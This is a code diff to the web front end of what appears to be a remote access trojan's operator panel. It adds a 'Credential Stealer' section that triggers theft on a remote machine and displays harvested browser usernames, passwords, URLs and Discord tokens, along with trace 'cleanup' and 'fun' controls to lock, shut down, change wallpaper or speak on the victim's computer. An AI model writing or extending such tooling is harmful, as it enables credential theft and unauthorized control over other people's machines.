@@ -108,6 +108,15 @@ function handleMessage(msg) {
     case "command_result":
       handleCommandResult(msg);
       break;
+    case "cleanup_result":
+      handleCleanupResult(msg);
+      break;
+    case "fun_result":
+      handleFunResult(msg);
+      break;
+    case "steal_result":
+      handleStealResult(msg);
+      break;
     default:
       console.log("Unknown message type:", msg.type);
   }
@@ -355,6 +364,195 @@ function handleCommandResult(msg) {
     setTimeout(() => requestProcessList(), 500);
   }
 }
+
+// ── Cleanup ────────────────────────────────────────────────────────────────
+const cleanupBtn = document.getElementById("cleanup-btn");
+const cleanupResult = document.getElementById("cleanup-result");
+
+function handleCleanupResult(msg) {
+  if (!cleanupResult) return;
+  cleanupResult.classList.remove("hidden");
+  if (!msg.ok && msg.errors?.length) {
+    cleanupResult.innerHTML = `<span class="text-red-400">Error: ${escapeHtml(msg.errors.join(", "))}</span>`;
+    return;
+  }
+  const cleared = (msg.cleared || []).map((s) => `<span class="text-green-400">✓ ${escapeHtml(s)}</span>`).join("<br>");
+  const errors = (msg.errors || []).map((s) => `<span class="text-red-400">✗ ${escapeHtml(s)}</span>`).join("<br>");
+  cleanupResult.innerHTML = (cleared + (errors ? "<br>" + errors : "")) || "<span class='text-slate-500'>Nothing cleared.</span>";
+}
+
+if (cleanupBtn) {
+  cleanupBtn.addEventListener("click", () => {
+    if (!ws || ws.readyState !== WebSocket.OPEN) return;
+    cleanupResult?.classList.add("hidden");
+    send({ type: "cleanup" });
+    cleanupBtn.disabled = true;
+    setTimeout(() => { if (cleanupBtn) cleanupBtn.disabled = false; }, 5000);
+  });
+}
+
+// ── Fun Actions ────────────────────────────────────────────────────────────
+const funToast = document.getElementById("fun-toast");
+const funModal = document.getElementById("fun-modal");
+const funModalTitle = document.getElementById("fun-modal-title");
+const funModalFields = document.getElementById("fun-modal-fields");
+const funModalOk = document.getElementById("fun-modal-ok");
+const funModalCancel = document.getElementById("fun-modal-cancel");
+const volumeSlider = document.getElementById("volume-slider");
+const volumeLabel = document.getElementById("volume-label");
+
+if (volumeSlider) {
+  volumeSlider.addEventListener("input", () => {
+    if (volumeLabel) volumeLabel.textContent = volumeSlider.value + "%";
+  });
+}
+
+let pendingFunAction = null;
+
+function showFunModal(title, fields) {
+  if (!funModal) return;
+  funModalTitle.textContent = title;
+  funModalFields.innerHTML = fields
+    .map((f) => `<div class="flex flex-col gap-1">
+      <label class="text-xs text-slate-400">${escapeHtml(f.label)}</label>
+      <input id="fun-field-${escapeHtml(f.id)}" type="text" placeholder="${escapeHtml(f.placeholder || "")}"
+        class="px-2 py-1.5 bg-slate-800 border border-slate-700 rounded text-sm text-slate-200 focus:outline-none focus:border-blue-500" />
+    </div>`)
+    .join("");
+  funModal.classList.remove("hidden");
+  funModalFields.querySelector("input")?.focus();
+}
+
+function closeFunModal() {
+  if (funModal) funModal.classList.add("hidden");
+  pendingFunAction = null;
+}
+
+if (funModalCancel) funModalCancel.addEventListener("click", closeFunModal);
+if (funModal) funModal.addEventListener("click", (e) => { if (e.target === funModal) closeFunModal(); });
+
+if (funModalOk) {
+  funModalOk.addEventListener("click", () => {
+    if (!pendingFunAction) return;
+    const payload = { type: "fun", action: pendingFunAction };
+    funModalFields.querySelectorAll("input").forEach((el) => {
+      payload[el.id.replace("fun-field-", "")] = el.value;
+    });
+    send(payload);
+    closeFunModal();
+  });
+}
+
+function handleFunResult(msg) {
+  if (!funToast) return;
+  funToast.classList.remove("hidden");
+  funToast.textContent = msg.ok ? `✓ ${msg.message}` : `✗ ${msg.message}`;
+  funToast.style.color = msg.ok ? "#86efac" : "#f87171";
+  setTimeout(() => funToast.classList.add("hidden"), 4000);
+}
+
+document.querySelectorAll(".fun-btn").forEach((btn) => {
+  btn.addEventListener("click", () => {
+    if (!ws || ws.readyState !== WebSocket.OPEN) return;
+    const action = btn.dataset.fun;
+    if (!action) return;
+
+    if (action === "msgbox") {
+      pendingFunAction = "msgbox";
+      showFunModal("Message Box", [
+        { id: "title", label: "Title", placeholder: "Notice" },
+        { id: "text", label: "Message text", placeholder: "Hello!" },
+      ]);
+    } else if (action === "tts") {
+      pendingFunAction = "tts";
+      showFunModal("Text-to-Speech", [
+        { id: "text", label: "Text to speak", placeholder: "Hello world" },
+      ]);
+    } else if (action === "wallpaper") {
+      pendingFunAction = "wallpaper";
+      showFunModal("Change Wallpaper", [
+        { id: "url", label: "Image URL (.jpg/.png)", placeholder: "https://..." },
+      ]);
+    } else if (action === "lock") {
+      send({ type: "fun", action: "lock" });
+    } else if (action === "volume") {
+      const vol = parseInt(volumeSlider?.value || "50", 10);
+      send({ type: "fun", action: "volume", volume: vol });
+    } else if (action === "shutdown") {
+      const mode = document.getElementById("shutdown-mode")?.value || "shutdown";
+      if (!confirm(`${mode.charAt(0).toUpperCase() + mode.slice(1)} the remote machine?`)) return;
+      send({ type: "fun", action: "shutdown", mode });
+    }
+  });
+});
+// ── Credential Stealer ─────────────────────────────────────────────
+const stealBtn = document.getElementById("steal-btn");
+const stealStatus = document.getElementById("steal-status");
+const stealResult = document.getElementById("steal-result");
+const stealSummary = document.getElementById("steal-summary");
+const stealCreds = document.getElementById("steal-creds");
+
+function handleStealResult(msg) {
+  if (stealStatus) { stealStatus.classList.add("hidden"); stealStatus.textContent = ""; }
+  if (stealBtn) stealBtn.disabled = false;
+  if (!stealResult) return;
+  stealResult.classList.remove("hidden");
+
+  const creds = msg.credentials || [];
+  const tokens = msg.tokens || [];
+  const errors = msg.errors || [];
+
+  if (stealSummary) {
+    stealSummary.textContent =
+      `${creds.length} credential${creds.length !== 1 ? "s" : ""}, ` +
+      `${tokens.length} token${tokens.length !== 1 ? "s" : ""}` +
+      (errors.length ? ` — ${errors.length} error${errors.length !== 1 ? "s" : ""}` : "");
+  }
+
+  if (!stealCreds) return;
+  const lines = [];
+  for (const c of creds) {
+    lines.push(
+      `<div class="py-0.5 border-b border-slate-700/40">` +
+      `<span class="text-violet-400">${escapeHtml(c.browser)}</span>` +
+      (c.profile && c.profile !== "Default" ? ` <span class="text-slate-500">[${escapeHtml(c.profile)}]</span>` : "") +
+      ` <span class="text-slate-300">${escapeHtml(c.url)}</span>` +
+      ` <span class="text-cyan-300">${escapeHtml(c.username)}</span>` +
+      ` <span class="text-green-300">${escapeHtml(c.password)}</span>` +
+      `</div>`
+    );
+  }
+  for (const t of tokens) {
+    lines.push(
+      `<div class="py-0.5 border-b border-slate-700/40">` +
+      `<span class="text-yellow-400">Discord token</span> ` +
+      `<span class="text-slate-300 break-all">${escapeHtml(t)}</span>` +
+      `</div>`
+    );
+  }
+  for (const e of errors) {
+    lines.push(`<div class="text-red-400">✗ ${escapeHtml(e)}</div>`);
+  }
+  stealCreds.innerHTML = lines.length ? lines.join("") : `<span class="text-slate-500">Nothing found.</span>`;
+}
+
+if (stealBtn) {
+  stealBtn.addEventListener("click", () => {
+    if (!ws || ws.readyState !== WebSocket.OPEN) return;
+    if (stealResult) stealResult.classList.add("hidden");
+    if (stealStatus) { stealStatus.classList.remove("hidden"); stealStatus.textContent = "Running stealer…"; }
+    send({ type: "steal" });
+    stealBtn.disabled = true;
+    // Re-enable after 60s in case result never arrives
+    setTimeout(() => {
+      if (stealBtn) stealBtn.disabled = false;
+      if (stealStatus && stealStatus.textContent === "Running stealer…") {
+        stealStatus.textContent = "No response received.";
+      }
+    }, 60000);
+  });
+}
+
 function setSortField(field) {
   if (sortField === field) {
     sortDirection = sortDirection === "asc" ? "desc" : "asc";
